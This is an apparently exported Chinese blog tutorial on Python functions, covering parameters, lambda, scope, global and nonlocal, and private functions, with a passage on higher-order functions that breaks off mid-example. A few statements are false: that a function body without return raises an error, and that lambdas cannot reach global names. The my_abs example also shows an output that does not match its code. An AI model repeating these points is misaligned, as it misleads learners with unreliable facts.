class="line">当前字母 : h </span><br><span class="line">当前字母 : o </span><br><span class="line">当前字母 : n </span><br><span class="line">Good bye! </span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-函数</title>
    <url>/post/Python-Function/</url>
    <content><![CDATA[<p>有两种定义函数的方法，千万不要忘了冒号和<code>return</code>   ( ´⚰︎` ) </p>
<span id="more"></span>

<br>

<br>


<center><font color="#00B2EE" face="Comic sans MS" size=5>函数</font> </center>


<br>

<br>

<blockquote>
<p><strong>函数分为：</strong><font color="#FF7F00"><strong>内置（系统）函数和自定义函数</strong></font>。</p>
</blockquote>
<ol>
<li>自定义函数又分为普通（有名字的）函数和匿名（无名字的）函数，二者定义方式不一样；</li>
<li>自定义和函数里面还可嵌套定义其他函数，匿名函数定义时是一条语句，并且要赋值给一个变量指针。</li>
<li>普通函数的函数体如果为空，则必须放入一条pass语句，否则会报错；函数体不为空的必须有return语句，否则会报错。</li>
</ol>
<br>

<br>

<h3 id="一-定义函数"><a href="#一-定义函数" class="headerlink" title="一. 定义函数"></a><font color="#FF6347" face="Comic sans MS">一. 定义函数</font></h3><blockquote>
<p><strong>自定义函数简单的规则：</strong></p>
</blockquote>
<ol>
<li>函数代码块以 <code>def</code> 关键词开头，依次写出函数名、括号、括号中的参数和冒号<code>:</code>。</li>
<li>函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明。</li>
<li>函数内容以冒号起始，并且缩进写代码块结构。</li>
<li>用<code>return [表达式] </code>结束函数，选择性地返回一个值给调用方。不带表达式的return相当于返回 None。还可以返回多个值，如<code>return x,y</code></li>
</ol>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>语法</strong></font></p>
<p>Python 定义函数使用 def 关键字，默认情况下，参数值和参数名称是按函数声明中定义的顺序匹配起来的。一般格式如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> 函数名（参数列表）:</span></span><br><span class="line">    函数体</span><br></pre></td></tr></table></figure>

<br>

<p>以自定义一个求绝对值的my_abs函数为例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_abs</span>(<span class="params">x</span>):</span></span><br><span class="line">    <span class="keyword">if</span> x &gt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> x</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> -x</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line"><span class="number">99</span></span><br></pre></td></tr></table></figure>


<br>

<br>

<h3 id="二-参数传递"><a href="#二-参数传递" class="headerlink" title="二. 参数传递"></a><font color="#FF6347" face="Comic sans MS">二. 参数传递</font></h3><p>在 python 中，类型属于对象，变量是没有类型的：<br><code>a=[1,2,3]</code><br><code>a=&quot;Runoob&quot;</code><br>以上代码中，[1,2,3] 是 List 类型，”Runoob” 是 String 类型，而变量 a 是没有类型，她仅仅是一个对象的引用（一个指针），可以是指向 List 类型对象，也可以是指向 String 类型对象。</p>
<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>一、可更改(mutable)与不可更改(immutable)对象</strong></font></p>
<p>在 python 中，<font color="#FF7F00"><strong>strings, tuples, 和 numbers 是不可更改的对象，而 list,dict 等则是可以修改的对象</strong></font>。</p>
<p>python 函数的参数传递：</p>
<ul>
<li><p><strong>不可变类型：</strong>类似 c++ 的值传递，如 <strong>整数</strong>、<strong>字符串</strong>、<strong>元组</strong>。如fun（a），传递的只是a的值，没有影响a对象本身。比如在 fun（a）内部修改 a 的值，只是修改另一个复制的对象，不会影响 a 本身。</p>
</li>
<li><p><strong>可变类型：</strong>类似 c++ 的引用传递（地址），如 <strong>列表</strong>，<strong>字典</strong>。如 fun（la），则是将 la 真正的传过去，修改后fun外部的la也会受影响</p>
</li>
</ul>
<blockquote>
<p>python 中<font color="#FF7F00"><strong>一切都是对象</strong></font>，严格意义我们不能说值传递还是引用传递，我们应该说<font color="#FF7F00"><strong>传不可变对象和传可变对象</strong></font>。</p>
</blockquote>
<br>

<p>python 传不可变对象实例:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ChangeInt</span>(<span class="params"> a </span>):</span></span><br><span class="line">    a = <span class="number">10</span></span><br><span class="line"> </span><br><span class="line">b = <span class="number">2</span></span><br><span class="line">ChangeInt(b)</span><br><span class="line"><span class="built_in">print</span>( b ) <span class="comment"># 结果是 2</span></span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p>实例中有 int 对象 2，指向它的变量是 b，在传递给 ChangeInt 函数时，按传值的方式复制了变量 b，a 和 b 都指向了同一个 Int 对象，在 a&#x3D;10 时，则新生成一个 int 值对象 10，并让 a 指向它。</p>
</blockquote>
</blockquote>
<br>

<p>传可变对象实例:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeme</span>(<span class="params"> mylist </span>):</span></span><br><span class="line">   <span class="string">&quot;修改传入的列表&quot;</span></span><br><span class="line">   mylist.append([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;函数内取值1: &quot;</span>, mylist)</span><br><span class="line">   mylist.append(<span class="number">5</span>)</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;函数内取值2: &quot;</span>, mylist)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用changeme函数</span></span><br><span class="line">mylist = [<span class="number">10</span>,<span class="number">20</span>,<span class="number">30</span>]</span><br><span class="line">changeme( mylist )</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;函数外取值: &quot;</span>, mylist)</span><br><span class="line"></span><br><span class="line">运行结果：</span><br><span class="line">函数内取值<span class="number">1</span>:  [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]]</span><br><span class="line">函数内取值<span class="number">2</span>:  [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], <span class="number">5</span>]</span><br><span class="line">函数外取值:  [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>], <span class="number">5</span>]</span><br></pre></td></tr></table></figure>


<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>二、参数</strong></font></p>
<p><strong>以下是调用函数时可使用的正式参数类型：</strong></p>
<ol>
<li><p><font color="#FF7F00"><strong>必需参数：</strong></font>调用函数时以正确的顺序传入函数。调用时的数量必须和声明时的一样。</p>
</li>
<li><p><font color="#FF7F00"><strong>关键字参数：</strong></font>允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。</p>
</li>
<li><p><font color="#FF7F00"><strong>默认参数：</strong></font>定义函数时可指定参数值，调用函数时，如果没有传递参数，则会使用默认参数。</p>
</li>
<li><p><font color="#FF7F00"><strong>不定长参数：</strong></font>能处理比当初声明时更多的参数，这些参数被包装进一个<font color="#FF7F00"><strong>元组</strong></font>或<font color="#FF7F00"><strong>字典</strong></font>，通常，这些 可变 参数是参数列表中的最后一个，因为它们将把所有的剩余输入参数传递给函数。</p>
</li>
</ol>
<br>

<p><font color="#FF7F00" face="Comic sans MS"><strong>1. 必需参数：</strong></font></p>
<p>必需参数须以正确的顺序传入函数。调用时的数量必须和声明时的一样。</p>
<p>调用printme()函数，你必须传入一个参数，不然会出现语法错误：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printme</span>(<span class="params"> <span class="built_in">str</span> </span>):</span></span><br><span class="line">   <span class="string">&quot;打印任何传入的字符串&quot;</span></span><br><span class="line">   <span class="built_in">print</span> (<span class="built_in">str</span>)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printme函数</span></span><br><span class="line">printme()</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;test.py&quot;</span>, line <span class="number">10</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    printme()</span><br><span class="line">TypeError: printme() missing <span class="number">1</span> required positional argument: <span class="string">&#x27;str&#x27;</span></span><br></pre></td></tr></table></figure>

<br>

<p><font color="#FF7F00" face="Comic sans MS"><strong>2. 关键字参数：</strong></font></p>
<p>关键字参数和函数调用关系紧密，函数调用使用关键字参数来确定传入的参数值。</p>
<p>使用关键字参数允许函数调用时参数的顺序与声明时不一致，因为 Python 解释器能够用参数名匹配参数值。<br>以下实例中演示了函数参数的使用不需要使用指定顺序：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span>(<span class="params"> name, age </span>):</span></span><br><span class="line">   <span class="string">&quot;打印任何传入的字符串&quot;</span></span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;名字: &quot;</span>, name)</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;年龄: &quot;</span>, age)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printinfo函数</span></span><br><span class="line">printinfo( age=<span class="number">50</span>, name=<span class="string">&quot;runoob&quot;</span> )</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line">名字:  runoob</span><br><span class="line">年龄:  <span class="number">50</span></span><br></pre></td></tr></table></figure>

<br>

<p><font color="#FF7F00" face="Comic sans MS"><strong>3. 默认参数：</strong></font></p>
<p>调用函数时，如果没有传递参数，则会使用默认参数。以下实例中如果没有传入 age 参数，则使用默认值：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span>(<span class="params"> name, age = <span class="number">35</span> </span>):</span></span><br><span class="line">   <span class="string">&quot;打印任何传入的字符串&quot;</span></span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;名字: &quot;</span>, name)</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;年龄: &quot;</span>, age)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用printinfo函数</span></span><br><span class="line">printinfo( age=<span class="number">50</span>, name=<span class="string">&quot;runoob&quot;</span> )</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;------------------------&quot;</span>)</span><br><span class="line">printinfo( name=<span class="string">&quot;runoob&quot;</span> )</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line">名字:  runoob</span><br><span class="line">年龄:  <span class="number">50</span></span><br><span class="line">------------------------</span><br><span class="line">名字:  runoob</span><br><span class="line">年龄:  <span class="number">35</span></span><br></pre></td></tr></table></figure>

<br>

<p><font color="#FF7F00" face="Comic sans MS"><strong>4. 不定长参数：</strong></font></p>
<blockquote>
<p><strong>你可能需要一个函数能处理比当初声明时更多的参数：</strong></p>
</blockquote>
<ol>
<li>加了星号 <code>*</code> 的参数会以<font color="#FF7F00"><strong>元组(tuple)</strong></font>的形式导入，存放所有未命名的变量参数。</li>
<li>加了两个星号<code>**</code>的参数会以<font color="#FF7F00"><strong>字典(dict)</strong></font>的形式导入。</li>
<li>声明函数时，参数中星号 * 可以单独出现。</li>
<li>如果单独出现星号 * 后的参数必须用关键字传入。</li>
</ol>
<br>

<ol>
<li>加了星号<code>*</code>的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span>(<span class="params"> arg1, *vartuple </span>):</span></span><br><span class="line">   <span class="string">&quot;打印任何传入的参数&quot;</span></span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;输出: &quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> (arg1)</span><br><span class="line">   </span><br><span class="line">   <span class="keyword">for</span> var <span class="keyword">in</span> vartuple:</span><br><span class="line">      <span class="built_in">print</span> (<span class="string">&quot;循环输出: &quot;</span>)</span><br><span class="line">      <span class="built_in">print</span> (var)</span><br><span class="line">   <span class="keyword">return</span></span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用printinfo 函数</span></span><br><span class="line">printinfo( <span class="number">10</span> )</span><br><span class="line">printinfo( <span class="number">70</span>, <span class="number">60</span>, <span class="number">50</span> )</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">输出:</span><br><span class="line"><span class="number">10</span></span><br><span class="line">输出:</span><br><span class="line"><span class="number">70</span></span><br><span class="line">循环输出:</span><br><span class="line"><span class="number">60</span></span><br><span class="line">循环输出:</span><br><span class="line"><span class="number">50</span></span><br></pre></td></tr></table></figure>

<br>

<ol start="2">
<li>加了两个星号<code>**</code>的参数会以字典的形式导入。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printinfo</span>(<span class="params"> arg1, **vardict </span>):</span></span><br><span class="line">   <span class="string">&quot;打印任何传入的参数&quot;</span></span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;输出: &quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> (arg1)</span><br><span class="line">   <span class="built_in">print</span> (vardict)</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用printinfo 函数</span></span><br><span class="line">printinfo(<span class="number">1</span>, a=<span class="number">2</span>,b=<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line"><span class="number">1</span></span><br><span class="line">&#123;<span class="string">&#x27;a&#x27;</span>: <span class="number">2</span>, <span class="string">&#x27;b&#x27;</span>: <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure>

<br>

<ol start="3">
<li>声明函数时，参数中星号 * 可以单独出现，例如:</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a,b,*,c</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a+b+c</span><br></pre></td></tr></table></figure>

<br>

<ol start="4">
<li>如果单独出现星号 * 后的参数必须用关键字传入。</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">a,b,*,c</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a+b+c</span><br><span class="line"> </span><br><span class="line">a = f(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>)   <span class="comment"># 报错</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line">报错如下：</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: f() takes <span class="number">2</span> positional arguments but <span class="number">3</span> were given</span><br><span class="line"></span><br><span class="line">改正方式：</span><br><span class="line">a = f(<span class="number">1</span>,<span class="number">2</span>,c=<span class="number">3</span>) <span class="comment"># 正常</span></span><br><span class="line"><span class="number">6</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="三-匿名函数"><a href="#三-匿名函数" class="headerlink" title="三. 匿名函数"></a><font color="#FF6347" face="Comic sans MS">三. 匿名函数</font></h3><p><font color="#00B2EE" face="Comic sans MS"><strong>python 使用 lambda 来创建匿名函数。</strong></font></p>
<blockquote>
<p><strong>所谓匿名，意即不再使用 def 语句这样标准的形式定义一个函数。</strong></p>
</blockquote>
<ol>
<li>lambda 只是一个表达式，函数体比 def 简单很多。</li>
<li>lambda的主体是一个表达式，而不是一个代码块。仅仅能在lambda表达式中封装有限的逻辑进去。</li>
<li>lambda 函数拥有自己的命名空间，且不能访问自己参数列表之外或全局命名空间里的参数。<br>虽然lambda函数看起来只能写一行，却不等同于C或C++的内联函数，后者的目的是调用小函数时不占用栈内存从而增加运行效率。</li>
</ol>
<br>

<p><strong>语法</strong><br>lambda 函数的语法只包含一个语句，如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">lambda</span> [arg1 [,arg2,.....argn]]:expression</span><br></pre></td></tr></table></figure>

<br>

<p>如下实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="built_in">sum</span> = <span class="keyword">lambda</span> arg1, arg2: arg1 + arg2</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 调用sum函数</span></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;相加后的值为 : &quot;</span>, <span class="built_in">sum</span>( <span class="number">10</span>, <span class="number">20</span> ))</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;相加后的值为 : &quot;</span>, <span class="built_in">sum</span>( <span class="number">20</span>, <span class="number">20</span> ))</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line">相加后的值为 :  <span class="number">30</span></span><br><span class="line">相加后的值为 :  <span class="number">40</span></span><br></pre></td></tr></table></figure>


<br>

<br>

<h3 id="四-变量作用域"><a href="#四-变量作用域" class="headerlink" title="四. 变量作用域"></a><font color="#FF6347" face="Comic sans MS">四. 变量作用域</font></h3><p>Python 中，程序的变量并不是在哪个位置都可以访问的，访问权限决定于这个变量是在哪里赋值的。</p>
<p>变量的作用域决定了在哪一部分程序可以访问哪个特定的变量名称。Python的作用域一共有4种，分别是：</p>
<ul>
<li><font color="#FF7F00"><strong>L （Local）</strong></font> 局部作用域</li>
<li><font color="#FF7F00"><strong>E （Enclosing）</strong></font> 闭包函数外的函数中(函数A中定义了函数B，A定义的变量对B来说是闭包函数外的函数)</li>
<li><font color="#FF7F00"><strong>G （Global）</strong></font> 全局作用域</li>
<li><font color="#FF7F00"><strong>B （Built-in）</strong></font> 内置作用域（内置函数所在模块的范围）</li>
</ul>
<p>以 L –&gt; E –&gt; G –&gt;B 的规则查找，即：在局部找不到，便会去局部外的局部找（例如闭包），再找不到就会去全局找，再者去内置中找。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">g_count = <span class="number">0</span>  <span class="comment"># 全局作用域</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>():</span></span><br><span class="line">    o_count = <span class="number">1</span>  <span class="comment"># 闭包函数外的函数中</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        i_count = <span class="number">2</span>  <span class="comment"># 局部作用域</span></span><br></pre></td></tr></table></figure>

<br>

<p>Python 中只有模块（module），类（class）以及函数（def、lambda）才会引入新的作用域，其它的代码块（如 if&#x2F;elif&#x2F;else&#x2F;、try&#x2F;except、for&#x2F;while等）是不会引入新的作用域的，也就是说这些语句内定义的变量，外部也可以访问，如下代码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">True</span>:</span><br><span class="line">    msg = <span class="string">&#x27;I am from Runoob&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line"></span><br><span class="line">输出结果：</span><br><span class="line">I am <span class="keyword">from</span> Runoob</span><br></pre></td></tr></table></figure>

<br>

<blockquote>
<p>实例中 msg 变量定义在 if 语句块中，但外部还是可以访问的。<br>如果将 msg 定义在函数中，则它就是局部变量，外部不能访问。</p>
</blockquote>
<br>

<br>

<h3 id="五-全局变量和局部变量"><a href="#五-全局变量和局部变量" class="headerlink" title="五. 全局变量和局部变量"></a><font color="#FF6347" face="Comic sans MS">五. 全局变量和局部变量</font></h3><p>定义在函数内部的变量拥有一个局部作用域，定义在函数外的拥有全局作用域。</p>
<p>局部变量只能在其被声明的函数内部访问，而全局变量可以在整个程序范围内访问。调用函数时，所有在函数内声明的变量名称都将被加入到作用域中。如下实例：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">total = <span class="number">0</span> <span class="comment"># 这是一个全局变量</span></span><br><span class="line"><span class="comment"># 可写函数说明</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum</span>(<span class="params"> arg1, arg2 </span>):</span></span><br><span class="line">    <span class="comment">#返回2个参数的和.&quot;</span></span><br><span class="line">    total = arg1 + arg2 <span class="comment"># total在这里是局部变量.</span></span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;函数内是局部变量 : &quot;</span>, total)</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line"> </span><br><span class="line"><span class="comment">#调用sum函数</span></span><br><span class="line"><span class="built_in">sum</span>( <span class="number">10</span>, <span class="number">20</span> )</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;函数外是全局变量 : &quot;</span>, total)</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line">函数内是局部变量 :  <span class="number">30</span></span><br><span class="line">函数外是全局变量 :  <span class="number">0</span></span><br></pre></td></tr></table></figure>

<br>

<p><font color="#00B2EE" face="Comic sans MS"><strong>global 和 nonlocal关键字</strong></font></p>
<blockquote>
<p><font color="#FF7F00"><strong>global</strong></font>：内部作用域使用全局变量，并且可以修改，作用影响全局；<br><font color="#FF7F00"><strong>nonlocal</strong></font>：函数A嵌套函数B，函数B使用函数A的变量，并且可以修改，作用影响函数A的这个变量；</p>
</blockquote>
<ol>
<li>当内部作用域想修改外部作用域的变量时，就要用到global和nonlocal关键字了。</li>
</ol>
<p>以下实例修改全局变量 num：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fun1</span>():</span></span><br><span class="line">    <span class="keyword">global</span> num  <span class="comment"># 需要使用 global 关键字声明</span></span><br><span class="line">    <span class="built_in">print</span>(num) </span><br><span class="line">    num = <span class="number">123</span></span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">fun1()</span><br><span class="line"><span class="built_in">print</span>(num)</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">123</span></span><br><span class="line"><span class="number">123</span></span><br></pre></td></tr></table></figure>

<br>

<ol start="2">
<li>如果要修改嵌套作用域（enclosing 作用域，外层非全局作用域）中的变量则需要 nonlocal 关键字了，如下实例：</li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">outer</span>():</span></span><br><span class="line">    num = <span class="number">10</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">inner</span>():</span></span><br><span class="line">        <span class="keyword">nonlocal</span> num   <span class="comment"># nonlocal关键字声明</span></span><br><span class="line">        num = <span class="number">100</span></span><br><span class="line">        <span class="built_in">print</span>(num)</span><br><span class="line">    inner()</span><br><span class="line">    <span class="built_in">print</span>(num)</span><br><span class="line">outer()</span><br><span class="line"></span><br><span class="line">以上实例输出结果：</span><br><span class="line"><span class="number">100</span></span><br><span class="line"><span class="number">100</span></span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="六-非公开函数"><a href="#六-非公开函数" class="headerlink" title="六. 非公开函数"></a><font color="#FF6347" face="Comic sans MS">六. 非公开函数</font></h3><blockquote>
<p><font color="#FF7F00"><strong>外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public</strong></font>。</p>
</blockquote>
<p>类似_xxx和__xxx这样的函数或变量就是非公开的（private），不应该被直接引用，比如_abc，__abc等；</p>
<p>之所以我们说，private函数和变量“不应该”被直接引用，而不是“不能”被直接引用，是因为Python并没有一种方法可以完全限制访问private函数或变量，但是，从编程习惯上不应该引用private函数或变量。</p>
<p>private函数或变量不应该被别人引用，那它们有什么用呢？请看例子：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_private_1</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello, %s&#x27;</span> % name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_private_2</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hi, %s&#x27;</span> % name</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">greeting</span>(<span class="params">name</span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name) &gt; <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> _private_1(name)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> _private_2(name)</span><br></pre></td></tr></table></figure>

<br>


<p>我们在模块里公开greeting()函数，而把内部逻辑用private函数隐藏起来了，这样，调用greeting()函数不用关心内部的private函数细节，这也是一种非常有用的代码封装和抽象的方法，即：</p>
<p>外部不需要引用的函数全部定义成private，只有外部需要引用的函数才定义为public</p>
]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python语言</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-函数式编程</title>
    <url>/post/Python-FunctionalProgramming/</url>
    <content><![CDATA[<p>装饰器还没搞懂，搞懂了再来继续写吧~<br>函数既可作为返回值也可作为函数的参数…一切都是对象，一切都是指针，一切都是东西…<br>返回函数（引用）和返回函数值是不一样滴….  ◡̈⃝︎⋆︎* </p>
<span id="more"></span>

<br>

<br>


<center><font color="#00B2EE" face="Comic sans MS" size=5>函数式编程</font> </center>


<br>

<br>

<br>

<center><font face="Comic sans MS">**函数式编程的一个特点就是，允许把函数本身作为参数传入另一个函数，还允许返回一个函数！**</font> </center>


<br>

<br>

<h3 id="一-高阶函数"><a href="#一-高阶函数" class="headerlink" title="一. 高阶函数"></a><font color="#FF6347" face="Comic sans MS">一. 高阶函数</font></h3><br>

<blockquote>
<ol>
<li><font color="#FF7F00"><strong>变量可以指向函数</strong></font>；</li>
<li><font color="#FF7F00"><strong>函数名也是变量</strong></font>；</li>
<li><font color="#FF7F00"><strong>函数可以作为return的返回值</strong></font>；</li>
<li><font color="#FF7F00"><strong>函数可以作为另一个函数的参数</strong></font>。</li>
</ol>
</blockquote>
<br>

<h4 id="1-1-变量指向函数"><a href="#1-1-变量指向函数" class="headerlink" title="1.1 变量指向函数"></a><font color="#3CB371" face="Comic sans MS">1.1 变量指向函数</font></h4><br>

<p>&amp;emsp;&amp;emsp; <font face="Microsoft YaHei">在讲变量和字符串的时候我们讲过，变量就是一个对象，可以当作一个指针使用，而函数名也是一个变量，也就是一个对象。函数名其实就是指向函数的变量！注意，函数名是一个变量！变量！变量！当作指针用。</font></p>
<p>&amp;emsp;&amp;emsp; <font face="Sans-serif">既然变量可以指向函数，函数的参数能接收变量，那么一个函数就可以接收另一个函数作为参数，这种函数就称之为<strong>高阶函数</strong>。<br></font></p>
<br>

<hr>
<hr>
<p><font color="red" face="Comic sans MS"><strong>见过两种函数赋值给变量的形式</strong></font><font face="Comic sans MS">，这两种形式是有区别的，分别总结一下。</font><br>一种是</p>
<p><strong><code>    a = f</code></strong></p>
<p>另一种是</p>
<p><strong><code>    a = f()</code></strong></p>
<p><font color="red"><strong>1.</strong> <strong><code>a = f</code></strong> <strong>型属于将变量指向函数。</strong></font></p>
<p>如下用示例说明：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">abs</span>(-<span class="number">10</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">abs</span>)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="number">10</span></span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">abs</span>&gt;</span><br><span class="line">------------------------------------------------------------------------------------------  </span><br><span class="line">可见，<span class="built_in">abs</span>(-<span class="number">10</span>)是函数调用，而<span class="built_in">abs</span>是函数本身。</span><br><span class="line">要获得函数调用结果，我们可以把结果赋值给变量：  </span><br><span class="line"></span><br><span class="line">x = <span class="built_in">abs</span>(-<span class="number">10</span>)</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="number">10</span></span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">但是，如果把函数本身赋值给变量呢？</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">abs</span></span><br><span class="line"><span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line">&lt;built-<span class="keyword">in</span> function <span class="built_in">abs</span>&gt;</span><br><span class="line">------------------------------------------------------------------------------------------</span><br><span class="line">结论：函数本身也可以赋值给变量，即：变量可以指向函数。</span><br><span class="line">如果一个变量指向了一个函数，那么，可否通过该变量来调用这个函数？用代码验证一下：</span><br><span class="line"></span><br><span class="line">f = <span class="built_in">abs</span></span><br><span class="line"><span class="built_in">print</span>(f(-<span class="number">10</span>))</span><br><span class="line"></span><br><span class="line">输出：</span><br><span class="line"><span class="number">10</span></span><br><span 